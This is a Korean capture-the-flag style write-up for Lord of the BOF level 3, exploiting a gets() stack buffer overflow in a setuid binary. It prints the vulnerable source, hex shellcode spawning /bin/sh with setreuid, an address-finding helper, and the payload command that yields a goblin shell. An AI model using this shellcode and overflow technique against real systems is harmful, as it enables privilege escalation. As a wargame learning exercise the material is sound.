---
title: LOB 3번 cobolt -> goblin Write-up
date: 2017-9-3 15:42:00
categories: LOB
tags: LOB, cobolt, goblin
---

## LOB 3번

    [cobolt@localhost cobolt]$ ls -l
    total 16
    -rwsr-sr-x    1 goblin   goblin      11824 Feb 26  2010 goblin
    -rw-r--r--    1 root     root          193 Mar 29  2010 goblin.c
    [cobolt@localhost cobolt]$ cat goblin.c
    /*
            The Lord of the BOF : The Fellowship of the BOF
            - goblin
            - small buffer + stdin
    */
    
    int main()
    {
        char buffer[16];
        gets(buffer);
        printf("%s\n", buffer);
    }

참고를 위해 LOB 2번 문제인 cobolt의 소스도 아래에 올려두었다.

    [gremlin@localhost gremlin]$ cat cobolt.c
    int main(int argc, char *argv[])
    {
        char buffer[16];
        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
    }

### 입력방식의 차이

두 프로그램은 문자열을 받아오는 방식에 있어서 서로 다르다. 이전의 문제에서는 `strcpy`를 통해 실행과 동시에 전달받은 문자열을 복사한 후 저장하였으나, 이번 문제에서는 프로그램 실행 후 `gets()`를 통해 문자열을 받아오는 것이다. 아래의 경우를 보며 확인해보자.

    [cobolt@localhost cobolt]$ ./goblin `python -c 'print"a"*21'`
    hello
    hello

argc값을 받아오지 않기 때문에 위처럼 python으로 전달한 값은 무시되고 `gets()`로 입력한 값인 'hello'만 받아온다. 그렇다고 쉘코드를 직접 입력해줘야하는 것은 아니다. 아래와 같이 FTZ 3번 문제에서 배운 대로 세미콜론을 사용하고, 괄호와 파이프를 적절히 조합하면 값을 전달할 수 있다.

    (python -c 'print "A"*21';cat)|./goblin

python으로 값을 출력한 다음, 표준 입력을 표준 출력으로 바꿔주는 역할을 하는 `cat`명령어로 값을 넘겨주도록 했다. 세미콜론은 한줄에 명령어를 여러개 입력할때 사용한다는 점에서 파이프와 비슷하지만 파이프의 경우 앞에서 나온 결과값을 뒤의 명령에서 사용한다는 점이 대조된다. 그리고 나서 앞의 결과를 파이프가 goblin에게 넘겨준다.

### 쉘코드
    
    [cobolt@localhost cobolt]$ export shell = `python -c 'print "\x31\xc0\xb0\x31\xc                                      d\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x6                                      8\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
    [cobolt@localhost cobolt]$ vi addr.c
    #include<stdio.h>
    int main(){
            printf("%#p \n", getenv("shell"));
    return 0;
    }
    [cobolt@localhost cobolt]$ gcc -o addr addr.c
    [cobolt@localhost cobolt]$ ./addr
    0xbfffff1c

참고로 메모리구조는 이전과 같다.

buffer(16byte)	|	SFP(4byte)	|	RET(4byte)

    [cobolt@localhost cobolt]$ ./addr
    0xbffffb34
    [cobolt@localhost cobolt]$ (python -c 'print "A"*16 + "\x90"*4 + "\x34\xfb\xff\xbf"';cat)|./goblin
    AAAAAAAAAAAAAAAA4ûÿ¿
    id
    uid=503(goblin) gid=502(cobolt) egid=503(goblin) groups=502(cobolt)
    my-pass
    euid = 503
    hackers proof

문제 소스는 비슷한데, 원리를 찾아보고 하니 생각보다 어려워진다.